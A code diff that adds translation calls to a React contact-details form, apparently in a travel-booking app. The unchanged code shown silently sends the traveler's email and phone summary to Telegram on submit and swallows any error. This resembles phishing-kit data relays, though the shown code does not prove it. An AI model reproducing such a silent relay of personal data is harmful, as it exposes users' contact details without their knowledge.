@@ -2,6 +2,7 @@ import React from 'react';
 import { useNavigate } from 'react-router-dom';
 import './TravelerDetails.css';
 import { sendTelegram, formatTravelerSummary } from './services/telegram';
+import { useTranslation } from './hooks/useTranslation';
 
 const BackIcon = () => (
   <svg width="24" height="24" fill="white" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
@@ -9,6 +10,7 @@ const BackIcon = () => (
 
 const ContactDetails: React.FC = () => {
   const navigate = useNavigate();
+  const { t } = useTranslation();
   // Инициализация синхронно из localStorage, чтобы форма заполнялась сразу
   const init = () => {
     try {
@@ -54,21 +56,21 @@ const ContactDetails: React.FC = () => {
     <div className="trav-page">
       <div className="trav-header">
         <button className="back-button" onClick={() => navigate(-1)}><BackIcon/></button>
-        <h1>Contact details</h1>
+        <h1>{t('contactDetails')}</h1>
         <div style={{ width: 24 }}></div>
       </div>
 
       <div className="section">
         <label className={`field ${invalidEmail ? 'error' : ''}`}>
-          <span>Contact email</span>
+          <span>{t('contactEmail')}</span>
           <input type="email" value={email} onChange={(e)=>setEmail(e.target.value)} />
-          {invalidEmail && <div className="hint">Enter a valid email address</div>}
+          {invalidEmail && <div className="hint">{t('enterValidEmail')}</div>}
         </label>
 
         <label className={`field ${invalidPhone ? 'error' : ''}`}>
-          <span>Contact number</span>
+          <span>{t('contactNumber')}</span>
           <input value={phone} onChange={(e)=>setPhone(e.target.value)} placeholder="e.g. +14155552671" />
-          {invalidPhone && <div className="hint">Enter an international number starting with +</div>}
+          {invalidPhone && <div className="hint">{t('enterInternationalNumber')}</div>}
         </label>
       </div>
 
@@ -93,7 +95,7 @@ const ContactDetails: React.FC = () => {
             sendTelegram(`${header}\n${summary}`);
           } catch {}
           navigate(-1);
-        }}>Done</button>
+        }}>{t('done')}</button>
       </div>
     </div>
   );
